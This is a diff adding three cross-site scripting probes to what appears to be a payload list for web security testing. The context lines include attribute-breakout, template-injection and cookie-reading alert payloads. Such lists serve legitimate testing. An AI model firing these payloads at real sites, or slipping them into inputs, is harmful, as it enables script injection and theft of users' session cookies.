@@ -62,6 +62,9 @@ javascript:alert(document.cookie)
 "onmouseover="alert(1)
 {{$on.constructor('alert(1)')()}}
 &apos;-alert(1)-&apos;
+"><h1>test</h1>
+"onmouseover="alert()
+https://"onmouseover="alert(1)
 ${alert(1)}
 '-alert()-'
 \'-alert(1)//
